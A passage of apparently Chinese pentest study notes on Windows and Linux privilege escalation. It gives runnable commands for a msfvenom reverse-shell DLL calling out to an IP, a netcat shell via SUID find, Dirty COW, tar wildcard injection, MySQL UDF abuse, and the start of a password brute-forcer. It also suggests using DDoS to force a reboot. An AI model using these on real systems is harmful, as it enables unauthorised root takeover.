src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094741213.png" alt="image-20230625094741213" style="zoom:80%"></li><li><p>执行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="注意的点"><a class="markdownIt-Anchor" href="#注意的点"></a> 注意的点</h4><ol><li>单纯令牌窃取是在一定的权限下才能实施成功的，需要有枚举system令牌的权限。</li><li>如果是普通权限，则使用烂土豆可以将令牌进行模拟，再使用令牌窃取完成攻击</li></ol><h3 id="dll劫持提权应用配合msfweb权限"><a class="markdownIt-Anchor" href="#dll劫持提权应用配合msfweb权限"></a> DLL劫持提权应用配合MSF——web权限</h3><p>Windows程序启动的时候需要DLL库进行支持。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><ul><li>1、应用程序加载的目录</li><li>2、C:\Windows\System32</li><li>3、C:\Windows\System</li><li>4、C:\Windows</li><li>5、当前工作目录 Current Working Directory，CWD</li><li>6、在 PATH 环境变量的目录（先系统后用户）</li></ul><p>CS中的使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升，但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><h4 id="dll劫持提权流程"><a class="markdownIt-Anchor" href="#dll劫持提权流程"></a> DLL劫持提权流程</h4><p><strong>信息收集----------&gt;进程调试----------&gt;制作 dll 并上传----------&gt;替换 dll----------&gt;启动应用后成功</strong></p><ul><li><p>信息收集：服务器上有的第三方软件</p><p>一般看有什么程序的文件夹</p></li><li><p>进程调试：程序运行的事=时候调用了那些dll（火绒剑可以看）</p><p>一般一些写在system的dll是改不了的，所以看存在程序同名目录下的dll文件。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625095218724.png" alt="image-20230625095218724" style="zoom:80%"></li></ul><ul><li><p>找到该dll，用msf生成木马进行替换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp</span><br><span class="line">lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/xiaodi.dll</span><br></pre></td></tr></table></figure></li><li><p>MSF启动监听，然后配合令牌窃取成功提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6677</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h4><ul><li>dll劫持提权需要<strong>特定软件应用的控制权限及启用配合</strong>，复杂鸡肋</li><li>AlwaysInstallElevated提权默认禁用配置，利用成功机会很少</li></ul><h3 id="不带引号服务路径配合msf"><a class="markdownIt-Anchor" href="#不带引号服务路径配合msf"></a> 不带引号服务路径配合MSF</h3><p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完 整路径，则系统会按字面解释它并执行，像这样。</p><p>带引号：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100010606.png" alt="image-20230625100010606" style="zoom:67%"><p>不带引号：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100053640.png" alt="image-20230625100053640" style="zoom:67%"><p>不带引号而且不安全的：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100611727.png" alt="image-20230625100611727" style="zoom:67%"><p>一旦我们使用了不带引号的方式执行命令，且命令中路径包含空格，将会出现这种情况：</p><p>首先是正常的（我直接拖进来的程序）：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100313042.png" alt="image-20230625100313042" style="zoom:50%"><p>不正常的：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100425455.png" alt="image-20230625100425455" style="zoom:67%"><p>因为有空格，那么后面的字符串就被认为是参数，传入到Program这个“程序”中，然而，没有这个程序。如果我们自己伪造一个Program程序，那么即可执行！</p><h4 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h4><ol><li><p>使用msf制作一个后门，命名为Program.exe，上传到目标服务器C盘根目录</p></li><li><p>启动服务/重启。</p><p>启动服务。可以在webshell中或者本地启动服务。但是测试时，webshell中启动不了，所以不带引号服务路径提权方法还是多用于本地提权。</p><p>重启啥的，可以使用ddos攻击</p></li></ol><h3 id="不安全服务权限配合msf本地权限"><a class="markdownIt-Anchor" href="#不安全服务权限配合msf本地权限"></a> 不安全服务权限配合MSF——本地权限</h3><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限。例如，可以直接修改它导致重定向执行文件。这样我们可以达到这样的效果：</p><ol><li><strong>修改服务项中的运行地址，将之从安全的，带引号的服务路径，变成不带引号的。</strong></li><li><strong>改成我们自己的木马地址</strong></li></ol><h4 id="流程-2"><a class="markdownIt-Anchor" href="#流程-2"></a> 流程</h4><p><strong>检测服务权限配置----------&gt;制作文件并上传----------&gt;更改服务路径指向----------&gt;调用后成功</strong></p><ol><li><p>检测服务权限配置</p><p>使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accessChk</a>这个命令，他是官方的，所以不会被杀掉。执行命令，检测当前用户所在组的服务权限（实战中一般都不是administrators组，这里仅做测试用），列出的都是当前用户可以操作的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;administrators&quot; *</span><br></pre></td></tr></table></figure><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101243436.png" alt="image-20230625101243436" style="zoom:50%"></li><li><p>制作木马并上传</p></li><li><p>看到有哪些可以更改的服务，那就到该服务下，改其地址！</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101309992.png" alt="image-20230625101309992" style="zoom:50%"><p>执行命令更改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config &quot;NewServiceName&quot; binpath=&quot;C:\Program.exe&quot;</span><br></pre></td></tr></table></figure><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101404246.png" alt="image-20230625101404246" style="zoom:50%"></li><li><p>启动服务</p></li></ol><h2 id="linux提权"><a class="markdownIt-Anchor" href="#linux提权"></a> Linux提权</h2><p>与windows一样，也是有web和本地提权之分</p><h3 id="用户权限"><a class="markdownIt-Anchor" href="#用户权限"></a> 用户权限</h3><p>使用id查看：超过1000是普通用户</p><h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3><p>包括：内核信息（<code>cat /proc/version</code>，<code>uname -a</code>）、用户群组（<code>id</code>，<code>who</code>，<code>cat /etc/group</code>）、环境信息（环境变量中可能存在密码或API密钥<code>cat /etc/profile</code>，<code>/etc/bashrc</code>）、进程服务、计划任务、有无ssh私钥（<code>cat ~/.ssh/authorized_keys</code>）、有无明文密码（配置文件，config之类的）、可读写执行目录。</p><p>自动化搜集：</p><ol><li>信息：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum</a>（<code>./LinEnum.sh</code>），<a target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker</a>（<code>python2 linuxprivchecker.py -w -o linuxprivchecker.log</code>）</li><li>漏洞：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a>，<a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a></li></ol><p>信息搜集有助于下一步的攻击、采取什么payload与攻击路线。</p><p>而LinEnum主要检测的，除了上述，就是一些特权访问的文件、作业、任务、一些web的版本信息等</p><h3 id="suid提权"><a class="markdownIt-Anchor" href="#suid提权"></a> SUID提权</h3><p>**SUID（set user id）是一种授予文件的权限类型，允许用户以其所有者的权限执行文件。**例如，ping实用程序需要root权限才能打开网络套接字，但它也需要由标准用户执行，以验证与其他主机的连接。通过将ping程序标记为SUID（所有者为root），只要标准用户执行ping程序，便会以root特权 执行ping。</p><p>但是如果某些现有的二进制文件和实用程序具有SUID权限，则可以使用它们将权限升级到root，我们可以使用它来提升我们的特权。</p><blockquote><p>之前遇到的：两个指令，一个是<code>cp</code>，一个是<code>unzip</code>，使用第一个指令，复制一个文件，那么我们就可以用自己的权限打开root才能打开的文件，第二个也是。</p></blockquote><p>允许权限提升的已知Linux可执行文件包括：</p><blockquote><p>Nmap / Vim / find / Bash / mv / More / Less / Nano / cp</p></blockquote><h4 id="流程-3"><a class="markdownIt-Anchor" href="#流程-3"></a> 流程</h4><ol><li><p>查找SUID可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>他们的特征是：有个s在他们的权限中，就是以super权限执行的程序（针对可执行文件或目录，使文件在执行阶段，<strong>临时拥有文件所有者的权限</strong>）。而且他们own by root。</p><blockquote><p>如果是使用<code>chomod u+s ???</code>那就是SUID</p></blockquote><p>利用方式参考：<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p></li><li><p>特定SUID利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch xiaodi</span><br><span class="line">find xiaodi -exec whoami \;</span><br><span class="line">find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</span><br><span class="line"></span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br></pre></td></tr></table></figure></li></ol><h3 id="内核漏洞提权"><a class="markdownIt-Anchor" href="#内核漏洞提权"></a> 内核漏洞提权</h3><p>上传并使用脚本：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a>，<a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a>来看看有哪些漏洞。然后上github找对应的exp。</p><h3 id="webshell权限与脏牛提权"><a class="markdownIt-Anchor" href="#webshell权限与脏牛提权"></a> webshell权限与脏牛提权</h3><h4 id="漏洞范围"><a class="markdownIt-Anchor" href="#漏洞范围"></a> 漏洞范围：</h4><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><h4 id="危害"><a class="markdownIt-Anchor" href="#危害"></a> 危害：</h4><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p><h4 id="简要分析"><a class="markdownIt-Anchor" href="#简要分析"></a> 简要分析：</h4><p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</p><p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/df72d1ee1e3e">脏牛Linux本地提权漏洞复现(CVE-2016-5195)</a></p><h4 id="流程-4"><a class="markdownIt-Anchor" href="#流程-4"></a> 流程</h4><p>找到攻击点，得到webshell，搜集信息，上传exp，然后编译运行：</p><p>exp:<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a> <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /root/dcow.cpp /tmp</span><br><span class="line">shell</span><br><span class="line">ls </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">./dcow</span><br></pre></td></tr></table></figure><h3 id="环境变量提权配合suid"><a class="markdownIt-Anchor" href="#环境变量提权配合suid"></a> 环境变量提权（配合SUID）</h3><h4 id="背景知识"><a class="markdownIt-Anchor" href="#背景知识"></a> 背景知识</h4><p>使用echo命令显示当前PATH环境变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure><p>如果你在PATH变量中看到**‘.’**，则意味着登录用户可以从当前目录执行二进制文件/脚本，这对于攻击者而言也是一个提权的绝好机会。这里之所以没有指定程序的完整路径，往往是因为编写程序时的疏忽造成的。</p><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/120941341">https://blog.csdn.net/qq_50854790/article/details/120941341</a></p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><p><strong>前提</strong>：</p><ul><li>配合 SUID 进行环境变量提权</li><li>本地用户权限</li></ul><p><strong>流程</strong>：手写调用文件+编译+复制文件+增加环境变量+执行触发</p><ol><li><p><strong>手写调用文件</strong>（这一步是我们为了测试用的，如果要使用这个方法进行提权，那么应该本身就要有这个suid的文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line"># 或者</span><br><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><p>demo.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;ps&quot;</span>);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>复制文件</strong>：<code>cp /bin/sh /tmp/ps</code>，把<code>/bin/sh</code>复制给<code>/tmp/ps</code>，<code>ps</code>命令本来是用于显示当前进程的状态，复制后执行<code>./ps</code>就变成了执行sh命令。</p></li><li><p><strong>增加环境变量</strong>：<code>export PATH=/tmp:$PATH</code></p></li><li><p><strong>执行触发</strong>：<code>./shell</code></p></li></ol><p><strong>解释</strong>：首先我们编一个触发<code>ps</code>命令的二进制文件，当然，其他指令也行，然后将<code>/bin/sh</code>这个文件复制到一个地方，这个地方是我们可以执行文件的，例如这个地址是<code>/tmp</code>，并且重新命名为<code>ps</code>，这样，我们运行<code>/tmp/ps</code>就相当于运行<code>sh</code>，后面，我们添加环境变量，则，将<code>tmp</code>下面的二进制文件都包括进来，也就是使用<code>ps</code>将不再是原来的功能，而是执行<code>sh</code>（顺序关系），所以，当我们运行我们的二进制文件时，会调用被替换的<code>ps</code>（即<code>/tmp/ps</code>），执行<code>sh</code>。</p><p>而关于提权，因为我们编译后，这个shell文件可能会是suid的文件，也就是带有<code>s</code>权限的文件，这样我们运行就可以以root运行了。</p><h3 id="计划任务-crontab"><a class="markdownIt-Anchor" href="#计划任务-crontab"></a> 计划任务 crontab</h3><img src="../../images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230626093000186.png" alt="image-20230626093000186" style="zoom:80%"><h4 id="路径or权限问题"><a class="markdownIt-Anchor" href="#路径or权限问题"></a> 路径or权限问题</h4><ul><li>利用计划任务指向的文件的相对路径解析问题</li></ul><p>流程：</p><ol><li><p>执行命令：<code>cat /etc/crontab</code>查看当前系统的定时任务，发现一个<code>test.sh</code>任务<strong>没有写绝对路径</strong>，而且是<strong>以root权限运行</strong>的。</p><p>没有写绝对路径，即默认调用<code>/usr/local/bin</code>目录下的<code>test.sh</code>脚本</p></li><li><p>看这个文件可不可写</p><ol><li><p>如果可以写（也就是权限过大），更改成可以创建shell的命令即可</p></li><li><p>如果不可以，则自己写一个与<code>test.sh</code>同名的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; &lt;/PATH/CRON/SCRIPT&gt;</span><br><span class="line">/tmp/bash -p</span><br></pre></td></tr></table></figure><p>如果root用户执行的脚本使用具有完全访问权限的目录，则删除该文件夹并创建一个<br>符号链接文件夹到另一个服务于您控制的脚本的文件夹可能会很有用。</p></li></ol></li></ol><h4 id="命令问题"><a class="markdownIt-Anchor" href="#命令问题"></a> 命令问题</h4><ul><li>利用通配符配合命令参数自定义命令实现提权</li></ul><p>流程：</p><ol><li><p>执行命令：<code>cat /etc/crontab</code>查看当前系统的定时任务，发现一个<code>test.sh</code>任务<strong>里面有敏感的命令：<code>tar cvf /var/tmp/backup.tar.gz</code> <strong>，而且是</strong>以root权限运行</strong>的。</p></li><li><p>在<code>/var/tmp/</code>下创建三个文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/undead/script/test.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure></li><li><p>当压缩文件<code>--checkpoint-action=exec=sh test.sh</code>和文件<code>--checkpoint=1</code>时，会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh test.sh</span><br></pre></td></tr></table></figure><p>而 --checkpoint、–checkpoint-action正好是tar命令的参数，打包到这里就会导致tar命令直接把–checkpoint=1和–checkpoint-action=exec=sh test.sh两个文件名当做参数执行，而不打包文件。</p><p>–checkpoint-action=exec=sh test.sh参数的意思是执行同目录下test.sh文件，test.sh文件内容又是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp bin/bash /tmp/bash; chmod +s /tmp/bash</span><br></pre></td></tr></table></figure><p>把 bin/bash拷贝给/tmp/bash并给/tmp/bash赋SUID权限。此时我们再执行/tmp/bash就享有了suid权限，所以这里是一环套一环的</p></li><li><p>其他类似tar提权的命令还有chown、chmod、rsync</p></li></ol><p>利用条件：root执行脚本+提权的命令+有通配符<code>*</code></p><h3 id="第三方服务linux提权数据库mysql_udf"><a class="markdownIt-Anchor" href="#第三方服务linux提权数据库mysql_udf"></a> 第三方服务——Linux提权数据库MySQL_UDF</h3><p>这里只是简单介绍一下流程，首先拿到webshell之后，转移给meterpreter。具体方法可以看Raven2打靶。之后进行信息搜集。</p><ol><li><p>上传冰蝎的webshell / 上传LinEnum，查看到有Mysql服务</p></li><li><p>全局找或者自己动手找config，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -name *config*</span><br><span class="line">/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php</span><br><span class="line">/var/www/html/wordpress/wp-admin/setup-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config-sample.php</span><br></pre></td></tr></table></figure><p>找到数据库的密码：R@v3nSecurity。则使用msf连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: R@v3nSecurity</span><br></pre></td></tr></table></figure></li><li><p>接下来就是UDF的常规操作了，首先看版本和安装目录。版本不行则用不了UDF，安装目录不知道则导出不了UDF.so文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| /usr      |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">select @@version;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@version       |</span><br><span class="line">+-----------------+</span><br><span class="line">| 5.5.60-0+deb8u1 |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实施操作，下载UDF文件，编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -</span><br><span class="line">mv raptor_udf.so udf.so</span><br></pre></td></tr></table></figure></li><li><p>创表，输出文件。这里我踩了个坑，我以为直接输出到<code>lib/plugin</code>，结果不是，是需要在mysql目录下的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table ha4k(line blob);</span><br><span class="line">insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"># 输出恶意so</span><br><span class="line">select * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"># 创建函数</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">&lt;mod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure></li><li><p>后面查找特权命令：<code>find / -user root -perm 4000 -print 2 &gt; /dev/null</code></p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628124849070.png" alt="image-20230628124849070"></p><p>OKOK，提权成功！</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628125028105.png" alt="image-20230628125028105"></p></li></ol><h3 id="linux-提权提升漏洞查找关注点-拓展总结"><a class="markdownIt-Anchor" href="#linux-提权提升漏洞查找关注点-拓展总结"></a> Linux 提权提升漏洞查找关注点-拓展总结</h3><ol><li><p>提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等)</p></li><li><p>最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本)</p></li><li><p>本地 searchsploit 脚本及远程 exploitdb 站点搜索说明（简要使用）</p></li><li><p>其他提权方法如：密码复用，guid，sudo 等说明(运气，同理，鸡肋等)</p><p>SUDO 说明参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a></p></li></ol><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a> <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><h2 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权"></a> 数据库提权</h2><p>在没有办法对系统进行提权的条件下，我们可以使用数据库进行提权，但需要知道数据库提权的前提条件：</p><ul><li>服务器开启数据库服务及获取到最高权限的用户密码</li><li>除了Access数据库外，其他数据库基本存在提取的可能</li></ul><p>我们需要明确：</p><ol><li><p>数据库应用提取那在权限提升中的意义</p><p>即：我们获得webshell，但是权限很低，我们通过某种方式获得数据库权限（root），于是通过这个数据库权限提升我们的webshell权限，或者直接给我们开一个用户啥的</p></li><li><p>web或本地提权如何探针数据库应用</p></li><li><p>数据库提权权限用户名密码搜集等方法</p><ol><li><p>读取网站的配置文件（了解其命名规则以及查找技巧）</p><p>关键字：sql data inc config conn database common include</p><blockquote><p>WWW/cms/inc/conn.info.php</p><p>WWW/cms/install/source/config.ini.php</p></blockquote></li><li><p>读取数据库存储或备份文件（了解其数据库存储方式以及对应内容）</p><p>例如：mysql：<code>@@basedir/data/数据库名/表名.myd</code>存的是表中的数据，而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到</p></li><li><p>使用脚本暴力破解（<strong>了解数据库是否支持外联</strong>以及如何开启外联）</p><p>外联：只支持本机连接本机，不允许外部连接。如果不支持，那就上传脚本，如果支持，那就在自己电脑上运行。以下脚本保存在web服务器中，我们访问即可。</p><p><strong>不支持外联</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Mysql账号密码在线爆破工具&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"> 